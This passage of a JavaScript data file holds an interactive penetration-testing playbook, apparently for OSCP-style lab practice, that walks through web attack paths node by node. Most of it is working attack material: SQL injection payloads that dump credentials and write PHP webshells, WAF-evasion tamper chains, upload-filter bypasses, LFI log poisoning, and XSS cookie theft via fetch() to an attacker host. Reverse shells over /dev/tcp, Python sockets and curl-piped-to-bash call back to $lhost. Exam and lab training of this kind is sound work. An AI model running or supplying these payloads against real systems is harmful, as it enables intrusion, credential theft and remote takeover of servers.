xsstrike -u "http://$ip/page?param=test"
xsstrike -u "http://$ip/page?param=test" --crawl
xsstrike -u "http://$ip/page?param=test" --blind
# --blind for blind XSS (out-of-band callback)

wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt \\
  --hc 404 "http://$ip/page?FUZZ=test"

# LFI wordlist
wfuzz -c -z file,/opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt \\
  --hc 404 "http://$ip/page?file=FUZZ"

# XSS fuzz
wfuzz -c -z file,/usr/share/wordlists/Fuzzing/XSS.txt \\
  "http://$ip/page?param=FUZZ"

# Command injection fuzz (POST)
wfuzz -c -z file,/usr/share/wordlists/Fuzzing/command-injection.txt \\
  -d "field=FUZZ" "http://$ip/page"

# HTML escape fuzz
wfuzz -c -z file,/usr/share/wordlists/Fuzzing/yeah.txt \\
  "http://$ip/page?param=FUZZ"`,
    warn: null,
    choices: [
      { label: "Found LFI", next: "lfi" },
      { label: "Found command injection", next: "cmd_injection" },
      { label: "Found XSS", next: "xss" },
      { label: "Found parameter — test for SQLi", next: "sqli_test" },
      { label: "Template injection ({{7*7}} returns 49)", next: "ssti" },
      { label: "URL/redirect parameter — SSRF", next: "ssrf" },
      { label: "XML input / SOAP endpoint / file upload", next: "xxe" },
      { label: "Numeric ID in URL or API — IDOR test", next: "idor" },
      { label: "Still nothing — searchsploit service versions", next: "searchsploit_web" },
    ],
  },

  param_found: {
    phase: "WEB",
    title: "Parameter Found",
    body: "URL parameter detected. Test for SQLi, LFI, and command injection manually first before reaching for tools — understand what the app is doing.",
    cmd: `# Quick manual tests
curl "http://$ip/page?id=1'"          # SQLi probe
curl "http://$ip/page?file=../../../etc/passwd"  # LFI probe
curl "http://$ip/page?cmd=;id"        # CMDi probe

# Check response differences carefully`,
    warn: null,
    choices: [
      { label: "SQLi looks promising", next: "sqli_test" },
      { label: "LFI response detected", next: "lfi" },
      { label: "Command injection response", next: "cmd_injection" },
      { label: "URL/redirect param — SSRF", next: "ssrf" },
      { label: "Template syntax reflected — SSTI", next: "ssti" },
    ],
  },

  wordpress: {
    phase: "WEB",
    title: "WordPress",
    body: "Run WPScan hard. Vulnerable plugins are the most reliable attack vector. Enumerate users, all plugins, all themes.",
    cmd: `# Full aggressive scan (free API token available at wpscan.com)
wpscan --url http://$ip \\
  --enumerate u,ap,at \\
  --plugins-detection aggressive \\
  --api-token <TOKEN>

# Brute force once you have usernames
wpscan --url http://$ip -U admin,editor \\
  -P /usr/share/wordlists/rockyou.txt \\
  --password-attack xmlrpc-multicall`,
    warn: null,
    choices: [
      { label: "Got admin creds — shell via theme editor", next: "wp_shell" },
      { label: "Found vulnerable plugin — searchsploit it", next: "searchsploit_web" },
      { label: "No creds yet — keep enumerating", next: "web_fuzz_deep" },
    ],
  },

  wp_shell: {
    phase: "WEB",
    title: "WordPress → Shell",
    body: "Two paths: theme editor (Appearance → Theme Editor → 404.php) or malicious plugin zip. Both drop a webshell.",
    cmd: `# Option 1: Theme Editor
# Appearance > Theme Editor > select 404.php
# Add: <?php system($_GET['cmd']); ?>
# Access: http://$ip/wp-content/themes/<theme>/404.php?cmd=id

# Option 2: Malicious Plugin
# Create plugin zip with PHP shell inside
# Upload via Plugins > Add New > Upload

# Once confirmed RCE — reverse shell
curl "http://$ip/wp-content/themes/theme/404.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$lhost/$lport+0>%261'"`,
    warn: null,
    choices: [
      { label: "RCE confirmed — catch shell", next: "reverse_shell" },
    ],
  },

  login_page: {
    phase: "WEB",
    title: "Login Page",
    body: "Test default creds first (5 minutes). Then SQLi bypass. Then brute force. Username enumeration via response differences is gold.",
    cmd: `# Default creds to try first
admin:admin  admin:password  admin:admin123
root:root    guest:guest     test:test
# Management consoles — try these too:
# HP Power Manager: admin:admin (lab validated: Kevin)
# Grafana:          admin:admin
# Jenkins:          admin:password  or no password
# Tomcat manager:   tomcat:tomcat  admin:admin
# SNMP:             community string = public
# Always try default BEFORE running any exploit

# SQLi bypass
' OR 1=1--
admin'--
' OR '1'='1'--

# Username enumeration — look for different response length/time
wfuzz -c -z file,/opt/SecLists/Fuzzing/USERNAMES/usernames.txt \\
  --hc 404,403 "http://$ip/users/FUZZ"

# Brute force with hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt \\
  http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" -V`,
    warn: null,
    choices: [
      { label: "Got access", next: "file_upload" },
      { label: "SQLi bypass worked", next: "sqli_test" },
      { label: "Brute force the login", next: "bruteforce" },
      { label: "Need usernames first", next: "web_fuzz_deep" },
    ],
  },

  sqli_test: {
    phase: "WEB",
    title: "SQL Injection — Detection",
    body: "Manual detection first. Understand what the injection IS before you automate. PortSwigger: the injection type determines the entire attack chain — error-based, UNION, blind boolean, blind time each need a different approach.",
    cmd: `# -- STEP 1: DETECT ----------------------
# Inject quote — look for error or behavioral change
'
''
# Numeric context
1 AND 1=1
1 AND 1=2    # different response = boolean blind

# -- STEP 2: IDENTIFY TYPE ----------------
# Error-based:    DB error visible in response body
# UNION-based:    predictable column structure returned
# Boolean blind:  same status code, different content length
# Time-based:     no visible difference — use delays

# -- STEP 3: COLUMN COUNT (for UNION) ----
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   # error at N = N-1 columns
# Or increment NULLs:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

# -- STEP 4: FIND STRING COLUMN -----------
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--

# -- SQLMAP QUICK START -------------------
sqlmap -u "http://$ip/page?id=1" --batch --level=2 --risk=2
sqlmap -u "http://$ip/login" --data="user=a&pass=b" --batch`,
    warn: "Read the RESPONSE not just the status code. Content length change with same 200 = boolean blind. Delay = time-based blind. Error text = error-based. These are different attack paths requiring different techniques.",
    choices: [
      { label: "Error visible in response — error-based", next: "sqli_error" },
      { label: "Column count found — UNION injection", next: "sqli_union" },
      { label: "Behavior changes but no output — blind boolean", next: "sqli_blind" },
      { label: "No difference at all — time-based blind", next: "sqli_time" },
      { label: "WAF blocking payloads", next: "sqli_waf" },
      { label: "sqlmap confirmed — escalate", next: "sqli_sqlmap" },
    ],
  },

  sqli_error: {
    phase: "WEB",
    title: "SQLi — Error-Based Extraction",
    body: "Error messages leak data directly into the response. Fastest extraction method when available. PortSwigger: use extractvalue() or updatexml() for MySQL, cast() for PostgreSQL, convert() for MSSQL.",
    cmd: `# -- MYSQL: extractvalue ------------------
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
' AND extractvalue(1,concat(0x7e,(SELECT user())))--
' AND extractvalue(1,concat(0x7e,(SELECT database())))--

# Enumerate tables
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--

# Enumerate columns
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users')))--

# Dump credentials (page results with LIMIT)
' AND extractvalue(1,concat(0x7e,(SELECT concat(username,0x3a,password) FROM users LIMIT 0,1)))--
' AND extractvalue(1,concat(0x7e,(SELECT concat(username,0x3a,password) FROM users LIMIT 1,1)))--

# -- MYSQL: updatexml alternative ---------
' AND updatexml(1,concat(0x7e,(SELECT version())),1)--

# -- MSSQL: convert -----------------------
' AND 1=convert(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND 1=convert(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))--

# -- POSTGRESQL: cast ---------------------
' AND 1=cast((SELECT version()) as int)--
' AND 1=cast((SELECT usename FROM pg_user LIMIT 1) as int)--`,
    warn: "extractvalue truncates at 32 chars. Use substring() to extract longer values: extractvalue(1,concat(0x7e,substring((SELECT password FROM users LIMIT 0,1),1,30)))",
    choices: [
      { label: "Got credentials", next: "creds_found" },
      { label: "DB structure mapped — escalate to FILE", next: "sqli_shell" },
      { label: "MSSQL — xp_cmdshell path", next: "mssql" },
      { label: "Output truncating — switch to UNION", next: "sqli_union" },
    ],
  },

  sqli_union: {
    phase: "WEB",
    title: "SQLi — UNION-Based Extraction",
    body: "Append your SELECT to the original query. PortSwigger: requires matching column count and compatible types. Most reliable extraction when columns are visible in response. Suppress original rows with AND 1=0.",
    cmd: `# Prerequisites: column count known, string column found
# Assume 3 columns, column 2 is string:

# -- DATABASE FINGERPRINT -----------------
' UNION SELECT NULL,version(),NULL--
' UNION SELECT NULL,database(),NULL--
' UNION SELECT NULL,user(),NULL--

# -- ENUMERATE STRUCTURE ------------------
# All databases
' UNION SELECT NULL,group_concat(schema_name),NULL FROM information_schema.schemata--

# Tables in current DB
' UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--

# Columns in users table
' UNION SELECT NULL,group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'--

# -- DUMP CREDENTIALS ---------------------
' UNION SELECT NULL,group_concat(username,0x3a,password SEPARATOR 0x0a),NULL FROM users--

# If original query returns rows (swallows yours):
' AND 1=0 UNION SELECT NULL,group_concat(username,0x3a,password),NULL FROM users--

# -- FILE READ ----------------------------
' UNION SELECT NULL,load_file('/etc/passwd'),NULL--
' UNION SELECT NULL,load_file('/var/www/html/config.php'),NULL--
' UNION SELECT NULL,load_file('/etc/apache2/sites-enabled/000-default.conf'),NULL--

# -- MSSQL UNION --------------------------
' UNION SELECT NULL,@@version,NULL--
' UNION SELECT NULL,name,NULL FROM master..sysdatabases--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--`,
    warn: "If UNION returns nothing but no error: the original query returns multiple rows, drowning yours. Add AND 1=0 to kill the original results. If still nothing: column types don't match — try casting: cast(version() as varchar).",
    choices: [
      { label: "Dumped credentials", next: "creds_found" },
      { label: "FILE read working — hunting configs", next: "sqli_shell" },
      { label: "MSSQL — escalate to xp_cmdshell", next: "mssql" },
      { label: "Write webshell via INTO OUTFILE", next: "sqli_shell" },
    ],
  },

  sqli_blind: {
    phase: "WEB",
    title: "SQLi — Blind Boolean Extraction",
    body: "No data in response — only true/false behavior difference. PortSwigger: infer data one character at a time. Confirm the technique manually with 2-3 payloads then hand off to sqlmap.",
    cmd: `# -- CONFIRM BOOLEAN BLIND ----------------
# True — normal response
' AND 1=1--
# False — different response (shorter, empty, redirect)
' AND 1=2--
# Must see a consistent behavioral difference

# -- MANUAL CONFIRMATION (2-3 tests) -----
# DB version starts with '8'?
' AND substring(version(),1,1)='8'--
# Current user is 'root'?
' AND (SELECT user())='root'--
# Table 'users' exists?
' AND (SELECT count(*) FROM users)>0--

# -- HAND OFF TO SQLMAP -------------------
# Boolean-only technique flag:
sqlmap -u "http://$ip/page?id=1" --technique=B --batch --level=3 --current-db

sqlmap -u "http://$ip/page?id=1" --technique=B --batch \
  -D [dbname] -T users -C username,password --dump

# POST data blind
sqlmap -u "http://$ip/login" --data="user=a&pass=b" \
  --technique=B --batch --level=3 --dbs

# -- BURP INTRUDER (manual extraction) ----
# Payload template:
# ' AND substring((SELECT password FROM users LIMIT 0,1),§POS§,1)='§CHAR§'--
# Cluster bomb: POS = 1..32, CHAR = a-z,0-9,special
# True = different response Content-Length`,
    warn: "Boolean blind is very slow manually — 8 requests per character at minimum. Confirm with 2-3 payloads then sqlmap with --technique=B. Add --threads=5 to speed extraction.",
    choices: [
      { label: "sqlmap extracting — got credentials", next: "creds_found" },
      { label: "Behavior too inconsistent — try time-based", next: "sqli_time" },
      { label: "WAF interfering", next: "sqli_waf" },
    ],
  },

  sqli_time: {
    phase: "WEB",
    title: "SQLi — Time-Based Blind",
    body: "Last resort — no visible response difference at all. PortSwigger: infer data from deliberate delays. Network latency makes this unreliable. Confirm then use sqlmap.",
    cmd: `# -- CONFIRM TIME-BASED -------------------
# MySQL SLEEP — expect 5 second delay
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--

# MSSQL WAITFOR
'; WAITFOR DELAY '0:0:5'--

# PostgreSQL pg_sleep
'; SELECT pg_sleep(5)--

# -- CONDITIONAL EXTRACTION ---------------
# Confirm technique before sqlmap
' AND IF(substring(version(),1,1)='8',SLEEP(3),0)--
' AND IF((SELECT user())='root',SLEEP(3),0)--

# -- SQLMAP TIME-BASED --------------------
sqlmap -u "http://$ip/page?id=1" \
  --technique=T --time-sec=5 --batch --level=3 \
  --current-db

sqlmap -u "http://$ip/page?id=1" \
  --technique=T --time-sec=5 --batch \
  -D [dbname] -T users -C username,password --dump

# -- OUT-OF-BAND FALLBACK -----------------
# MySQL DNS exfil (requires outbound DNS)
' AND load_file(concat(0x5c5c5c5c,(SELECT version()),0x2e,0x61747461636b65722e636f6d,0x5c5c,0x7368617265))--
# Use interactsh or Burp Collaborator to catch callback`,
    warn: "Server load makes time-based unreliable — a busy server looks the same as a SLEEP(5). Increase --time-sec=8 on slow networks. If delays are wildly inconsistent, the technique won't work reliably.",
    choices: [
      { label: "sqlmap confirmed — extracting", next: "sqli_sqlmap" },
      { label: "Got credentials", next: "creds_found" },
      { label: "Unstable — look for other vectors", next: "web_fuzz_deep" },
    ],
  },

  sqli_waf: {
    phase: "WEB",
    title: "SQLi — WAF Evasion",
    body: "WAF pattern-matching keywords and characters. PortSwigger: evasion uses encoding, comment injection, case variation, and whitespace alternatives to break patterns without breaking SQL syntax.",
    cmd: `# -- DETECT WAF ---------------------------
wafw00f http://$ip
# 403/406/501 on SQL payloads = WAF active

# -- ENCODING BYPASSES --------------------
# URL encode critical chars
%27 = '     %20 = space     %2D%2D = --
# Double encode
%2527 = %27 = '

# Hex string encoding (MySQL)
0x61646d696e = 'admin'
' UNION SELECT NULL,0x61646d696e,NULL--

# -- COMMENT INJECTION --------------------
# Break keywords with inline comments
UN/**/ION SEL/**/ECT NULL,version(),NULL--
' UN/**/ION SEL/**/ECT NULL,version(),NULL--

# MySQL version comments
/*!UNION*/ /*!SELECT*/ NULL,version(),NULL--
/*!50000 union*/ /*!50000 select*/ NULL,version(),NULL--

# -- CASE + SPACE VARIATION ---------------
uNiOn SeLeCt
UnIoN aLl SeLeCt

# Space substitutes: /**/ %09(tab) %0a(newline) %0d +
'%09UNION%09SELECT%09NULL,version(),NULL--

# -- SQLMAP TAMPER SCRIPTS ----------------
sqlmap -u "http://$ip/page?id=1" \
  --tamper=space2comment,between,randomcase,charencode \
  --random-agent --delay=1 --batch --level=3

# Common tampers:
# space2comment  — spaces → /**/
# between        — > → BETWEEN x AND y
# randomcase     — random keyword casing
# charencode     — URL encode payload
# unmagicquotes  — bypass magic quote escaping
# base64encode   — base64 the payload

# Aggressive evasion stack:
sqlmap -u "http://$ip/page?id=1" \
  --tamper=space2comment,charencode,between,randomcase \
  --random-agent --delay=2 --retries=3 \
  --batch --level=5 --risk=3`,
    warn: "Aggressive scanning gets you rate-limited or blocked entirely. Add --delay=2 to sqlmap. Slow + encoded > fast + obvious against a WAF.",
    choices: [
      { label: "Bypass worked — UNION extraction", next: "sqli_union" },
      { label: "Bypass worked — sqlmap running", next: "sqli_sqlmap" },
      { label: "WAF too aggressive — different param", next: "sqli_blind" },
    ],
  },

  sqli_sqlmap: {
    phase: "WEB",
    title: "SQLi — sqlmap Full Escalation",
    body: "sqlmap is allowed on OSCP. Use it confidently but understand each flag. The escalation ladder: confirm → enumerate → dump → OS shell → file write.",
    cmd: `# -- STAGE 1: CONFIRM + FINGERPRINT ------
sqlmap -u "http://$ip/page?id=1" --batch --dbs

# -- STAGE 2: DUMP CREDENTIALS ------------
sqlmap -u "http://$ip/page?id=1" --batch -D [dbname] --tables
sqlmap -u "http://$ip/page?id=1" --batch -D [dbname] -T users --columns
sqlmap -u "http://$ip/page?id=1" --batch -D [dbname] -T users \
  -C username,password --dump

# -- POST / REQUEST FILE ------------------
# Capture in Burp → save to req.txt
sqlmap -r req.txt --batch --level=3 --risk=2 --dbs

# -- COOKIE INJECTION ---------------------
sqlmap -u "http://$ip/page" \
  --cookie="id=1*" --batch --level=3

# -- AUTHENTICATED SESSION -----------------
sqlmap -u "http://$ip/page?id=1" \
  --headers="Authorization: Bearer TOKEN" --batch

# -- OS SHELL -----------------------------
# Requires: MySQL FILE priv OR MSSQL sa/xp_cmdshell
sqlmap -u "http://$ip/page?id=1" --os-shell

# -- FILE READ ----------------------------
sqlmap -u "http://$ip/page?id=1" --file-read="/etc/passwd"
sqlmap -u "http://$ip/page?id=1" --file-read="/var/www/html/config.php"

# -- FILE WRITE (webshell) -----------------
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
sqlmap -u "http://$ip/page?id=1" \
  --file-write="/tmp/shell.php" \
  --file-dest="/var/www/html/shell.php"

# -- MSSQL STACKED QUERIES → SHELL --------
sqlmap -u "http://$ip/page?id=1" \
  --technique=S --os-shell`,
    warn: "--os-shell can fail silently. If it opens but commands don't execute: wrong webroot path. Use --file-read to probe config files and confirm the correct path first.",
    choices: [
      { label: "Dumped credentials", next: "creds_found" },
      { label: "os-shell working — upgrade to reverse shell", next: "sqli_shell" },
      { label: "File write succeeded — webshell live", next: "sqli_shell" },
      { label: "MSSQL — xp_cmdshell", next: "mssql" },
    ],
  },

  sqli_shell: {
    phase: "WEB",
    title: "SQLi → Shell",
    body: "DB access to OS shell. INTO OUTFILE for MySQL (needs FILE priv + webroot path). xp_cmdshell for MSSQL. COPY TO for PostgreSQL. Know the webroot — file write to wrong path is silent failure.",
    cmd: `# -- MYSQL: INTO OUTFILE ------------------
# Requires FILE privilege + writable webroot

# 1. Confirm FILE privilege
' UNION SELECT NULL,file_priv,NULL FROM mysql.user WHERE user=user()--

# 2. Find webroot
' UNION SELECT NULL,load_file('/etc/apache2/sites-enabled/000-default.conf'),NULL--
' UNION SELECT NULL,load_file('/etc/nginx/sites-enabled/default'),NULL--
' UNION SELECT NULL,load_file('/var/www/html/index.php'),NULL--

# 3. Write webshell
' UNION SELECT NULL,"<?php system($_GET['cmd']); ?>",NULL INTO OUTFILE '/var/www/html/shell.php'--

# 4. Verify + execute
curl "http://$ip/shell.php?cmd=id"
curl "http://$ip/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$lhost/$lport+0>%261'"

# -- MSSQL: xp_cmdshell -------------------
# Enable if disabled (requires sa or sysadmin)
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--

# Execute
'; EXEC xp_cmdshell 'whoami';--
'; EXEC xp_cmdshell 'powershell -nop -w hidden -enc [BASE64]';--

# -- POSTGRESQL: COPY TO -------------------
'; COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/html/shell.php';--

# -- SQLMAP SHORTCUT ----------------------
sqlmap -u "http://$ip/page?id=1" --os-shell
# If webroot known:
sqlmap -u "http://$ip/page?id=1" \
  --file-write="/tmp/shell.php" --file-dest="/var/www/html/shell.php"`,
    warn: "INTO OUTFILE fails silently if: (1) FILE privilege missing, (2) file already exists — SQL won't overwrite, (3) path is wrong. Confirm FILE priv first. If file exists, delete it via another vector or use sqlmap --file-write which does overwrite.",
    choices: [
      { label: "Webshell live — catch reverse shell", next: "reverse_shell" },
      { label: "xp_cmdshell working — catch shell", next: "reverse_shell" },
      { label: "No FILE priv — dump creds instead", next: "sqli_sqlmap" },
      { label: "Got creds from dump", next: "creds_found" },
    ],
  },

  file_upload: {
    phase: "WEB",
    title: "File Upload → Webshell",
    body: "Two problems to solve: (1) get the file accepted, (2) find where it landed. Work them in parallel. Check source code and intercept responses for upload paths before fuzzing blind.",
    cmd: `# ── STEP 1: FIND WHERE FILES GO ───────────────────────
# Check the page source BEFORE uploading — look for hints
curl -s http://$ip/upload.php | grep -i "upload\\|path\\|dir\\|folder\\|dest"

# After uploading a test file, check the response
# Burp: look at the response body for a URL or path
# Common paths to check immediately:
curl http://$ip/uploads/test.txt
curl http://$ip/upload/test.txt
curl http://$ip/files/test.txt
curl http://$ip/images/test.txt
curl http://$ip/media/test.txt
curl http://$ip/assets/test.txt
curl http://$ip/static/test.txt
curl http://$ip/data/test.txt
curl http://$ip/tmp/test.txt
curl http://$ip/temp/test.txt

# Fuzz for the upload directory after uploading
ffuf -u http://$ip/FUZZ/test.txt \\
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
  -mc 200 -fs 0

# If filename is preserved — fuzz with your filename
ffuf -u http://$ip/FUZZ/shell.php \\
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
  -mc 200

# Check if app reveals path in response headers or body
curl -v http://$ip/upload.php -X POST -F "file=@test.txt" 2>&1 | grep -i "location\\|path\\|url\\|href"

# ── STEP 2: PHP WEBSHELL PAYLOADS ─────────────────────
# Simple command execution — GET parameter
<?php system($_GET['cmd']); ?>

# POST parameter (harder to detect in logs)
<?php system($_POST['cmd']); ?>

# Both GET and POST
<?php system($_REQUEST['cmd']); ?>

# Passthru — alternative to system()
<?php passthru($_GET['cmd']); ?>

# Shell_exec — returns output as string
<?php echo shell_exec($_GET['cmd']); ?>

# Exec — only returns last line
<?php exec($_GET['cmd'], $out); echo implode("\n", $out); ?>

# Full featured — accepts cmd via POST, shows output
<?php if(isset($_POST['cmd'])){echo '<pre>'.shell_exec($_POST['cmd']).'</pre>';}?>

# One-liner reverse shell via webshell
# First: set up listener: sudo nc -lvnp 443
# Then hit: http://$ip/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$lhost/443+0>%261'

# ── STEP 3: BYPASS FILTER — EXTENSION ────────────────
# Try in order:
.php
.php3
.php4
.php5
.php7
.phtml
.phar
.shtml
.cgi

# Double extension (server processes first dot)
shell.php.jpg
shell.php.png
shell.php.gif

# Null byte — older PHP/servers
shell.php%00.jpg
shell.php .jpg

# Case variation
shell.PHP
shell.Php
shell.pHp

# ── STEP 4: BYPASS FILTER — CONTENT-TYPE ─────────────
# In Burp — change Content-Type header after upload accepted
# Change: application/x-php
# To:     image/jpeg   OR   image/png   OR   image/gif

# curl with spoofed content type
curl http://$ip/upload.php \\
  -F "file=@shell.php;type=image/jpeg"

# ── STEP 5: MAGIC BYTES BYPASS ───────────────────────
# Prepend image magic bytes so file reads as an image
# GIF89a — most common bypass
printf 'GIF89a
<?php system($_GET["cmd"]); ?>' > shell.php.gif

# PNG magic bytes
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.png.php

# JPEG magic bytes
printf '\xff\xd8\xff<?php system($_GET["cmd"]); ?>' > shell.jpg.php

# exiftool — embed PHP in image metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg

# ── STEP 6: EXECUTE THE SHELL ─────────────────────────
# Simple command test
curl "http://$ip/uploads/shell.php?cmd=id"
curl "http://$ip/uploads/shell.php?cmd=whoami"
curl "http://$ip/uploads/shell.php?cmd=ls+-la"

# URL encode spaces and special chars
curl "http://$ip/uploads/shell.php?cmd=cat+/etc/passwd"
curl "http://$ip/uploads/shell.php?cmd=cat%20/etc/passwd"

# POST method
curl -X POST http://$ip/uploads/shell.php -d "cmd=id"

# ── STEP 7: UPGRADE TO REVERSE SHELL ─────────────────
# Listener on Kali
sudo nc -lvnp 443

# Bash reverse shell via webshell (URL encoded)
curl "http://$ip/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$lhost/443+0>%261'"

# Python reverse shell via webshell
curl "http://$ip/uploads/shell.php?cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect(("$lhost",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"

# Serve shell.sh and execute it
echo 'bash -i >& /dev/tcp/$lhost/443 0>&1' > shell.sh
python3 -m http.server 8000
# Then via webshell:
curl "http://$ip/uploads/shell.php?cmd=curl+http://$lhost:8000/shell.sh|bash"

# ── STEP 8: WINDOWS ASPX / ASP SHELLS ────────────────
# ASPX webshell — use for IIS targets
# msfvenom generated:
msfvenom -p windows/x64/shell_reverse_tcp \\
  LHOST=$lhost LPORT=443 -f aspx -o shell.aspx

# Simple ASPX cmd shell (copy-paste)
# <%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %>
# <% Response.Write(new Process(){StartInfo=new ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd()); %>

# Execute
curl "http://$ip/uploads/shell.aspx?cmd=whoami"`,
    warn: "Always check the HTTP response after uploading — the path is often in the response body or Location header. If you can't find the upload dir, upload a unique filename then fuzz for it. Magic bytes bypass works when server checks file content but not extension. exiftool embed is stealthier than a naked PHP file.",
    choices: [
      { label: "Got webshell executing commands", next: "reverse_shell" },
      { label: "Uploaded but can't find the file", next: "web_fuzz_deep" },
      { label: "Extension blocked — try LFI instead", next: "lfi" },
      { label: "IIS target — ASPX path", next: "iis_aspx" },
      { label: "Need to upgrade to reverse shell", next: "reverse_shell" },
    ],
  },


  lfi: {
    phase: "WEB",
    title: "Local File Inclusion → RCE",
    body: "LFI alone gets file reads. Escalate to RCE via log poisoning, PHP wrappers, or /proc/self/environ. Windows paths are completely different — know both. Use wordlists to find files fast.",
    cmd: `# -- DETECTION ----------------------------
http://$ip/page?file=../../../../etc/passwd
http://$ip/page?file=../../../etc/passwd
http://$ip/page?file=/etc/passwd

# -- FILTER BYPASSES ----------------------
# Null byte (PHP < 5.3.4)
http://$ip/page?file=../../../../etc/passwd%00
# Double encode
http://$ip/page?file=..%252f..%252f..%252fetc%252fpasswd
# Path truncation (old PHP)
http://$ip/page?file=../../../../etc/passwd/././././././././././././././././.

# -- LINUX HIGH-VALUE FILES ----------------
/etc/passwd
/etc/shadow
/etc/hosts
/etc/crontab
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log
/home/[user]/.ssh/id_rsa
/home/[user]/.bash_history
/var/www/html/config.php
/var/www/html/.env
/var/www/html/wp-config.php

# -- WINDOWS HIGH-VALUE FILES --------------
# win.ini = LFI canary on Windows — confirms it works
C:/Windows/win.ini
C:/Windows/System32/drivers/etc/hosts
C:/inetpub/wwwroot/web.config              # IIS — often has DB creds
C:/Windows/System32/inetsrv/config/applicationHost.config  # app pool creds
C:/xampp/apache/conf/httpd.conf
C:/xampp/FileZillaFTP/FileZilla Server.xml  # FTP creds
C:/ProgramData/MySQL/MySQL Server 5.5/my.ini
C:/Users/Administrator/Desktop/proof.txt
C:/Windows/repair/SAM

# Windows path traversal variations (try all)
..\\..\\..\\Windows\\win.ini
....//....//....//Windows/win.ini
%5c..%5c..%5cWindows%5cwin.ini

# -- FFUF LFI WORDLIST FUZZING -------------
# Linux
ffuf -u "http://$ip/page?file=FUZZ" \
  -w /opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
  -fw 0 -t 50

# Windows — dedicated Windows path list
ffuf -u "http://$ip/page?file=FUZZ" \
  -w /opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt \
  -fw 0 -t 50 -mc 200

# Combined both OS (thorough)
ffuf -u "http://$ip/page?file=FUZZ" \
  -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -fw 0 -t 50

# Add traversal prefix if basic path blocked
ffuf -u "http://$ip/page?file=../../../FUZZ" \
  -w /opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt \
  -fw 0

# -- PHP WRAPPERS --------------------------
# Source code read (base64 encode)
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=../config.php
# Decode: echo "BASE64OUTPUT" | base64 -d

# RCE via data wrapper (needs allow_url_include=On)
data://text/plain,<?php system('id')?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+

# -- LOG POISONING → RCE ------------------
# Step 1: Inject PHP into access log via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://$ip/
# Or via SSH login attempt (hits auth.log):
ssh '<?php system($_GET["cmd"]); ?>'@$ip

# Step 2: Include log with command parameter
http://$ip/page?file=/var/log/apache2/access.log&cmd=id
http://$ip/page?file=/var/log/auth.log&cmd=id`,
    warn: "Windows LFI: always try win.ini first as your canary. If it reads, LFI is confirmed on Windows. web.config and applicationHost.config frequently contain plaintext credentials — highest value reads on a Windows/IIS target.",
    choices: [
      { label: "Log poisoning RCE — get shell", next: "reverse_shell" },
      { label: "PHP wrapper RCE working", next: "reverse_shell" },
      { label: "Found SSH key", next: "ssh_key" },
      { label: "Found creds in config / web.config", next: "creds_found" },
      { label: "Need custom wordlist for deeper fuzzing", next: "custom_wordlist" },
    ],
  },

  cmd_injection: {
    phase: "WEB",
    title: "Command Injection",
    body: "Confirmed OS command execution. Test operators manually, then use commix for automation and WAF bypass.",
    cmd: `# Manual operators — try each
; whoami
| id
|| id
& id
&& id
\`id\`
$(id)

# Out-of-band detection (if blind)
; ping -c1 $lhost
; curl http://$lhost/

# commix — automated, WAF-aware
commix --url="http://$ip/page?param=" \\
  --level=3 --force-ssl --skip-waf --random-agent

# wfuzz wordlist sweep
wfuzz -c -z file,/usr/share/wordlists/Fuzzing/command-injection.txt \\
  -d "field=FUZZ" "http://$ip/page"`,
    warn: null,
    choices: [
      { label: "Confirmed RCE — get reverse shell", next: "reverse_shell" },
    ],
  },

  xss: {
    phase: "WEB",
    title: "XSS",
    body: "XSS alone rarely wins. Cookie theft → session hijack → admin access is the path. Stored XSS is far more valuable than reflected.",
    cmd: `# Cookie theft
<script>
  fetch('http://$lhost/?c='+btoa(document.cookie))
</script>

# Listen for cookies
nc -nlvp 80

# BeEF for advanced exploitation (if available)
# Hook: <script src="http://$lhost:3000/hook.js"></script>

# CSP bypass check
